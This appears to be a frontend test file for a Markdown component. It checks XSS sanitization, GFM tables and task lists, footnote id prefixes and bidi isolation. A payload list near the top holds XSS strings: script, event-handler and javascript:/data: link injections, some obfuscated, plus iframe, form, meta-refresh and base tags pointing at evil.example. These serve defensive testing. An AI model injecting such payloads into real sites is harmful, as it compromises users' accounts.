import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

afterEach(cleanup);

/**
 * The hostile-payload payloads each attack a different channel: element
 * injection, attribute injection, scheme smuggling, and re-parenting. None may
 * survive into the DOM, because note content is untrusted UGC and an executed
 * payload is an account-level compromise, not a rendering glitch.
 */
const HOSTILE_PAYLOADS: ReadonlyArray<{ name: string; payload: string }> = [
  { name: "a script element", payload: "<script>window.__xss = 1</script>" },
  {
    name: "a script element with a src",
    payload: '<script src="https://evil.example/x.js"></script>',
  },
  {
    name: "an img with an onerror handler",
    payload: '<img src="x" onerror="window.__xss = 1">',
  },
  {
    name: "an svg with an onload handler",
    payload: '<svg onload="window.__xss = 1"></svg>',
  },
  {
    name: "an inline event handler on a link",
    payload: '<a href="#" onclick="window.__xss = 1">x</a>',
  },
  { name: "a javascript: link", payload: "[click](javascript:window.__xss=1)" },
  {
    name: "a javascript: link in mixed case",
    payload: "[click](JaVaScRiPt:alert(1))",
  },
  {
    name: "a javascript: link padded with a control character",
    payload: "[click](java\tscript:alert(1))",
  },
  {
    name: "a javascript: raw-HTML href",
    payload: '<a href="javascript:window.__xss=1">x</a>',
  },
  {
    name: "a data: URL link",
    payload:
      "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  },
  { name: "a data: SVG image", payload: "![x](data:image/svg+xml,<svg/>)" },
  { name: "a style element", payload: "<style>body { display: none }</style>" },
  { name: "a style attribute", payload: '<p style="position:fixed">x</p>' },
  {
    name: "an iframe",
    payload: '<iframe src="https://evil.example"></iframe>',
  },
  {
    name: "a form with an action",
    payload: '<form action="https://evil.example"><input name="x"></form>',
  },
  {
    name: "a meta refresh",
    payload: '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  },
  {
    name: "a base element",
    payload: '<base href="https://evil.example/">',
  },
];

const FORBIDDEN_ELEMENTS = [
  "script",
  "style",
  "iframe",
  "form",
  "meta",
  "base",
  "object",
  "embed",
  "svg",
  "link",
];

describe("Markdown — ADR-0003 §Verification item 5", () => {
  it.each(HOSTILE_PAYLOADS)(
    "refuses $name: no hostile element survives",
    ({ payload }) => {
      const { container } = render(<Markdown source={payload} />);
      for (const element of FORBIDDEN_ELEMENTS) {
        expect(container.querySelector(element)).toBeNull();
      }
    },
  );

  it.each(HOSTILE_PAYLOADS)(
    "refuses $name: no handler or style attribute survives anywhere",
    ({ payload }) => {
      const { container } = render(<Markdown source={payload} />);
      for (const element of Array.from(container.querySelectorAll("*"))) {
        for (const attribute of Array.from(element.attributes)) {
          const name = attribute.name.toLowerCase();
          expect(name.startsWith("on")).toBe(false);
          expect(name).not.toBe("style");
        }
      }
    },
  );

  it.each(HOSTILE_PAYLOADS)(
    "refuses $name: no dangerous URL scheme is reachable",
    ({ payload }) => {
      const { container } = render(<Markdown source={payload} />);
      const urlBearing = Array.from(
        container.querySelectorAll("[href], [src], [srcset], [cite]"),
      );
      for (const element of urlBearing) {
        for (const attribute of Array.from(element.attributes)) {
          const value = attribute.value.replace(/\s/g, "").toLowerCase();
          expect(/^(javascript|vbscript|data|file):/.test(value)).toBe(false);
        }
      }
    },
  );

  it("does not execute a payload as a side effect of rendering", () => {
    render(
      <Markdown source={HOSTILE_PAYLOADS.map((p) => p.payload).join("\n\n")} />,
    );
    expect((globalThis as { __xss?: unknown }).__xss).toBeUndefined();
  });

  it("drops raw HTML entirely rather than rendering it as elements or text", () => {
    // This is the *first* layer of the control, and it is why the schema is
    // defence in depth rather than the only thing between a note and the DOM:
    // without `rehype-raw` the markdown parser never turns authored HTML into
    // nodes at all. Asserting the drop — rather than asserting a "safe"
    // rendering of the payload — means adding `rehype-raw` fails here first.
    const { container } = render(
      <Markdown source={"<script>window.__xss = 1</script>"} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toBe("");
  });
});

describe("Markdown — GFM features the contracts promise", () => {
  it("renders a table with real table semantics", () => {
    const { container } = render(
      <Markdown source={"| Stage | Owner |\n| --- | --- |\n| Ingest | BE |"} />,
    );
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelectorAll("th").length).toBe(2);
    expect(container.querySelectorAll("td").length).toBe(2);
  });

  it("gives a table's horizontal overflow its own keyboard-reachable, named container", () => {
    const { container } = render(<Markdown source={"| a |\n| --- |\n| 1 |"} />);
    const scroll = container.querySelector(
      '[data-slot="markdown-table-scroll"]',
    );
    expect(scroll).not.toBeNull();
    expect(scroll?.getAttribute("tabindex")).toBe("0");
    expect(scroll?.getAttribute("aria-label")).toBe("Table");
    expect(scroll?.classList.contains("overflow-x-auto")).toBe(true);
  });

  it("keeps a fenced code block keyboard-scrollable and language-tagged", () => {
    const { container } = render(
      <Markdown source={"```ts\nconst x = 1;\n```"} />,
    );
    const pre = container.querySelector("pre");
    expect(pre?.getAttribute("tabindex")).toBe("0");
    expect(pre?.classList.contains("overflow-x-auto")).toBe(true);
    const code = container.querySelector("pre code");
    expect(code?.textContent).toContain("const x = 1;");
    expect(code?.classList.contains("language-ts")).toBe(true);
  });

  it("renders a task list with an inert checkbox", () => {
    const { container } = render(
      <Markdown source={"- [ ] todo\n- [x] done"} />,
    );
    const checkbox = container.querySelector('input[type="checkbox"]');
    expect(checkbox).not.toBeNull();
    expect(checkbox?.hasAttribute("disabled")).toBe(true);
  });

  it("renders strikethrough and autolinks", () => {
    const { container } = render(
      <Markdown source={"~~gone~~ and https://example.com"} />,
    );
    expect(container.querySelector("del")).not.toBeNull();
    expect(container.querySelector("a")?.getAttribute("href")).toBe(
      "https://example.com",
    );
  });
});

describe("Markdown — sanitizer is actually wired", () => {
  it("runs the sanitize plugin: GFM footnote anchors survive with prefixed ids", () => {
    // `id` is allowed only because footnotes need anchor targets, and only
    // through `clobberPrefix`. Seeing the prefix in the output is evidence the
    // plugin ran, rather than evidence it was silently dropped from the chain.
    const { container } = render(
      <Markdown source={"Text[^1]\n\n[^1]: The note."} />,
    );
    const withId = Array.from(container.querySelectorAll("[id]"));
    expect(withId.length).toBeGreaterThan(0);
    for (const element of withId) {
      expect(
        (element.getAttribute("id") ?? "").startsWith("user-content-"),
      ).toBe(true);
    }
  });
});

describe("Markdown — directionality and isolation", () => {
  it("isolates code tokens", () => {
    const { container } = render(<Markdown source={"a `fn_name()` call"} />);
    const bdi = container.querySelector("code > bdi");
    expect(bdi?.textContent).toBe("fn_name()");
  });

  it("isolates link text", () => {
    const { container } = render(
      <Markdown source={"[user@example.com](mailto:user@example.com)"} />,
    );
    expect(container.querySelector("a > bdi")).not.toBeNull();
  });

  it("sets no direction attribute of its own", () => {
    // `lang`/`dir` have exactly one source (`apps/web/app/locale.ts`); a render
    // block that sets direction locally would be a second one.
    const { container } = render(<Markdown source={"# heading"} />);
    expect(container.querySelector("[dir]")).toBeNull();
  });

  it("uses no physical-direction utility classes", () => {
    const { container } = render(<Markdown source={"| a |\n| --- |\n| 1 |"} />);
    for (const element of Array.from(container.querySelectorAll("*"))) {
      for (const className of Array.from(element.classList)) {
        expect(
          /^(ml|mr|pl|pr|left|right|text-left|text-right)-/.test(className),
        ).toBe(false);
      }
    }
  });
});

describe("Markdown — ordinary markdown still renders", () => {
  it("renders headings, emphasis, lists and quotes", () => {
    const { container } = render(
      <Markdown
        source={
          "# Title\n\nSome **bold** and *italic* text.\n\n- one\n- two\n\n> quoted"
        }
      />,
    );
    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("em")?.textContent).toBe("italic");
    expect(container.querySelectorAll("li").length).toBe(2);
    expect(container.querySelector("blockquote")).not.toBeNull();
  });

  it("renders an empty source without throwing", () => {
    const { container } = render(<Markdown source={""} />);
    expect(container.querySelector('[data-slot="markdown"]')).not.toBeNull();
  });
});
